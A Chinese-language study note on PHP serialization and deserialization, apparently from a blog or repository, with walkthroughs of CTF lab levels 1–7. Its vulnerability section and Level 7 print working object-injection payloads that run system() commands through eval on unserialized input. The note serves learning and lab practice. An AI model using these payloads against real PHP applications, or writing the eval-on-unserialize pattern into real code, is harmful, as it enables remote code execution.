# PHP序列化及反序列化——学习笔记
序列化 是将 PHP 对象转换为字符串的过程，可以使用 serialize() 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。

反序列化 是将序列化后的字符串转换回 PHP 对象的过程，可以使用 unserialize() 函数来实现。该函数会将序列化的字符串解码，并将其转换回原始的 PHP 对象。

序列化的目的是方便数据的存储，在 PHP 中，他们常被用到缓存、session、cookie 等地方。

## php面向对象基本概念
**面向过程vs面向对象**

面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。

面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。

**类的定义**

类是定义了一件事物的抽象特点，将数据的形式、操作封装在一起（如水果）

对象是具有类类型的变量，是对类的实例（如苹果）

内部构成：成员变量（属性）+成员函数（方法）

继承：子类自动共享父类数据结构和方法的机制，是类之间的关系

**类的结构**

类：定义类名、定义成员变量（属性）、定义成员函数（方法）
```
class Class_name{
//成员变量声明
//成员函数声明
}
```

创建一个类
```
class hero{
  var $name;
  var $sex;
  function jineng($var1) {
    echo $this->name;
    echo $var1;
    }
}
```
$this-> 在类里面去调用类的成员属性

**实例化和赋值**
```
class hero{ //类
  var $name;
  var $sex;
  function jineng($var1) {
    echo $this->name;
    echo '释放了技能：'.$var1;
    }
}
$cyj= new hero(); //对象
$cyj->name='chengyaojin';
$cyj->sex='man';
print_r($cyj); //只会打印成员属性，不会打印成员方法

$cyj->jineng(var1:'zuofan'); //调用成员方法，会得到 chengyaojin释放了技能：zuofan
```

**类的修饰符介绍**
访问权限修饰符：对属性的定义

常用访问权限修饰符：

public：公共的，在类的内部、子类中或者类的外部都可以使用，不受限制；

protected：受保护的，在类的内部、子类中可以使用，但不能在类的外部使用；

private：私有的，只能在类的内部使用，在类的外部或者子类中都无法使用。

子类调用：
![QQ_1743707162322](https://github.com/user-attachments/assets/db9217d7-fd0c-48d6-9244-632261d19bda)

![QQ_1743707337393](https://github.com/user-attachments/assets/fdb353a9-988e-4557-8320-06aa1fc9d3ea)

成员方法也可以在function前加一些访问权限修饰符

## 序列化基础知识 
序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程，即将对象或数组转化为可储存/传输的字符串

在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示。

### 序列化演示
![QQ_1743708194064](https://github.com/user-attachments/assets/f8babd09-709a-4789-963d-4a79d625e70b)

例子：
```
<?php
highlight_file(__FILE__);
class TEST {
    public $data;
    public $data2 = "dazzhuang";
    private $pass;

    public function __construct($data, $pass)
    {
        $this->data = $data;
        $this->pass = $pass;
    }
}
$number = 34;
$str = 'user';
$bool = true;
$null = NULL;
$arr = array('a' => 10, 'b' => 200);
$test = new TEST('uu', true);
$test2 = new TEST('uu', true);
$test2->data = &$test2->data2;
echo serialize($number)."<br />";
echo serialize($str)."<br />";
echo serialize($bool)."<br />";
echo serialize($null)."<br />";
echo serialize($arr)."<br />";
echo serialize($test)."<br />";
echo serialize($test2)."<br />";
?>

i:34;
s:4:"user";
b:1;
N;
a:2:{s:1:"a";i:10;s:1:"b";i:200;}
O:4:"TEST":3:{s:4:"data";s:2:"uu";s:5:"data2";s:9:"dazzhuang";s:10:"TESTpass";b:1;}
O:4:"TEST":3:{s:4:"data";s:9:"dazzhuang";s:5:"data2";R:2;s:10:"TESTpass";b:1;}
```

### 数组序列化
```
<?php
highlight_file(__FILE__);
$a = array('benben','dazhuang','laoliu');
echo $a[0];
echo serialize($a);
?>
benben
a:3:{i:0;s:6:"benben";i:1;s:8:"dazhuang";i:2;s:6:"laoliu";}
```

### 对象序列化
对象内只包含成员属性，不会序列化成员方法
```
<?php
highlight_file(__FILE__);
class test{
    public $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1 //成员属性的数量:{s:3:"pub";s:6:"benben";}
```

**private私有属性序列化时，在变量名前加"%00类名%00"**
```
<?php
highlight_file(__FILE__);
class test{
    private $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1:{s:9:"testpub";s:6:"benben";} //实际上是%00test%00pub即0test0pub，二进制0 0不显示
```

***protected受保护属性序列化时，在变量名前加"%00*%00"**

```
<?php
highlight_file(__FILE__);
class test{
    protected $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
$a = new test();
echo serialize($a);
?>
O:4:"test":1:{s:6:"*pub";s:6:"benben";} //实际上为0*0pub
```

**成员属性调用对象**
实例化后的对象$a的成员变量ben调用实例化后的对象$b
```
<?php
highlight_file(__FILE__);
class test{
    var $pub='benben';
    function jineng(){
        echo $this->pub;
    }
}
class test2{
    var $ben;
    function __construct(){
        $this->ben=new test();
    }
}
$a = new test2();
echo serialize($a);
?>
O:5:"test2":1:{s:3:"ben";O:4:"test":1:{s:3:"pub";s:6:"benben";}}
```

## 反序列化基础知识
### 反序列化的作用
将序列化后的参数还原成实例化的对象，即将字符串反序列化为对象

需要使用函数unserialize()

1.反序列化之后的内容为一个对象

2.反序列化生成的对象里的值，由反序列化里的值（字符串$a）提供，与原有类预定义的值无关

3.反序列化不改变类的成员方法，需要调用方法后才能触发
```
<?php
highlight_file(__FILE__);
class test {
    public  $a = 'benben';
    protected  $b = 666;
    private  $c = false;
    public function displayVar() {
        echo $this->a;
    }
}
$d = new test();
$d = serialize($d);
echo $d."<br />";
echo urlencode($d)."<br />";
$a = urlencode($d);
$b = unserialize(urldecode($a));
var_dump($b);

?>

 O:4:"test":3:{s:1:"a";s:6:"benben";s:4:"*b";i:666;s:7:"testc";b:0;}
O%3A4%3A%22test%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A6%3A%22benben%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A666%3Bs%3A7%3A%22%00test%00c%22%3Bb%3A0%3B%7D
object(test)#1 (3) { ["a"]=> string(6) "benben" ["b":protected]=> int(666) ["c":"test":private]=> bool(false) }
```

### 反序列化漏洞
反序列化漏洞的成因：

1.反序列化过程中，unserialize()接收的值是可控的，通过修改这个值（字符串），得到所需要的代码，即生成的对象的属性值

2.通过调用方法，触发代码执行

```
<?php
highlight_file(__FILE__);
error_reporting(0);
class test{
    public $a = 'echo "this is test!!";';
    public function displayVar() {
        eval($this->a);
    }
}

$get = $_GET["benben"];  //benben为对象序列化后的字符串
$b = unserialize($get);  //$b把字符串$get反序列化为对象，更改字符串得到$a的值
$b->displayVar() ;  //调用方法触发可控代码

?>

例如
?benben=O:4:"test":1:{s:1:"a";s:13:"system("ls");";}
```

## 魔术方法
在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（__）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 / 反序列化 的过程。

```
 __wakeup() //------ 执行unserialize()时，先会调用这个函数
 __sleep() //------- 执行serialize()时，先会调用这个函数
 __destruct() //---- 对象被销毁时触发
 __call() //-------- 在对象上下文中调用不可访问的方法时触发
 __callStatic() //-- 在静态上下文中调用不可访问的方法时触发
 __get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法
 __set() //--------- 用于将数据写入不可访问的属性
 __isset() //------- 在不可访问的属性上调用isset()或empty()触发
 __unset() //------- 在不可访问的属性上使用unset()时触发
 __toString() //---- 把类当作字符串使用时触发
 __invoke() //------ 当尝试将对象调用为函数时触发
```


# 反序列化靶场
## Level1-类的实例化
直接将FLAG实例化即可

![image](https://github.com/user-attachments/assets/4515c74b-6b78-49c3-b27b-fbd75097a7c8)

得到flag

![image](https://github.com/user-attachments/assets/c68515cd-4376-4903-ba05-8562ea68c11c)

## Level2-值的传递
将 $flag_string 赋值给 $free_flag，再通过调用get_free_flag()将他输出出来

![image](https://github.com/user-attachments/assets/fadeb7ad-86c3-4ea2-98bf-7451f45cdb42)

但不知道为什么flag没有显示出来

![image](https://github.com/user-attachments/assets/ea9f1be9-8538-4843-b2ba-dc61c61604e5)

看网上还有一种方法是非预期解也很好

![image](https://github.com/user-attachments/assets/d6b2f3b6-1f9a-4449-aa0b-ab6e7b20ffd7)

![image](https://github.com/user-attachments/assets/8dce264a-4f3b-480b-b2ec-60b717184bbe)

## Level3-值的传递
直接将三种类型的flag打印连起来即可

![image](https://github.com/user-attachments/assets/c4fc7119-5b45-4b1d-b7e4-80c78685a9c3)

拿到flag：NSSCTF{se3_me_4nd_g3t_mmmme}

## Level4-初体验
将$flag_is_here序列化后打印出来

![image](https://github.com/user-attachments/assets/6fdc9108-f653-44ee-a317-080d950a294a)

![image](https://github.com/user-attachments/assets/4be94763-80f9-42bc-9939-93a35eea54c0)

拼接起来即可得 NSSCTF{ser4l1ze2se3me}

## Level5-普通值规则
payload一下各个参数序列化后的值，即可得到flag

o=O:7:"a_class":1:{s:7:"a_value";s:4:"FLAG";}&s=s:5:"IWANT";&a=a:2:{s:1:"a";s:3:"Plz";s:1:"b";s:7:"Give_M3";}&i=i:1;&b=b:1;&n=N;

![image](https://github.com/user-attachments/assets/6407b7cd-519c-4dd0-a783-759b1937bdb5)

## Level6-权限修饰规则
这题需要对private私有属性和protected受保护属性序列化，即可获得flag

protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D&private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D

![image](https://github.com/user-attachments/assets/13a3347d-6a0f-495c-9caa-c88b4abc46be)

![image](https://github.com/user-attachments/assets/139af564-f2cd-4bc3-b98d-90a26616b838)

## Level7-实例化和反序列化
进入后发现此题通过改变序列化的字符串来决定"还原"对象的值

这道题可以修改s:24:"echo 'Hello World!<br>';"来控制backdoor()函数进行命令执行

![image](https://github.com/user-attachments/assets/7221d29c-a648-4aef-baa7-32def7a7ab7c)

对以下这段指令进行url编码

o=O:4:"FLAG":1:{s:12:"flag_command";s:23:"system('tac flag.php');";}

得到

o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag_command%22%3Bs%3A23%3A%22system('tac%20flag.php')%3B%22%3B%7D

![image](https://github.com/user-attachments/assets/2faf7b14-2483-4d01-89ae-69e163ee170d)

拿到flag

## Level8-GC机制
下周继续补完...
